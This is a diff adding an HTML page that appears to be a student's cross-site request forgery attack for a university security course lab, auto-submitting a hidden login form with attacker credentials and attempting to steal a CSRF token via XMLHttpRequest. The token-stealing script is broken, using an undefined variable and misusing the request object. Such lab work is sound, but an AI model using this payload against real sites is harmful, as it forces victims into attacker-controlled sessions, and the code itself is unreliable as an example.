@@ -1,0 +1,24 @@
+<html>
+  <body>
+      <!-- https://project2.ecen4133.org/login?csrfdefense=0&xssdefense=4 -->
+    <form action="https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0" method="POST">
+      <input type="hidden" name="username" value="attacker" />
+      <input type="hidden" name="password" value="l33th4x" />
+    </form>
+    <script>
+      var req = new XMLHttpRequest();
+        req.open('GET', 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0', true);
+        req.onload = function (e) {
+        if (req.readyState === XMLHttpRequest.DONE && cred.status === 200) {
+            // Get the document from the response
+            page = req.response;
+            // Get the input element
+            input = page.getElementById("csrf_token");
+            token = input.value;
+            req.send('csrf_token='+token);
+        }
+        };
+        document.forms[0].submit();
+    </script>
+  </body>
+</html>
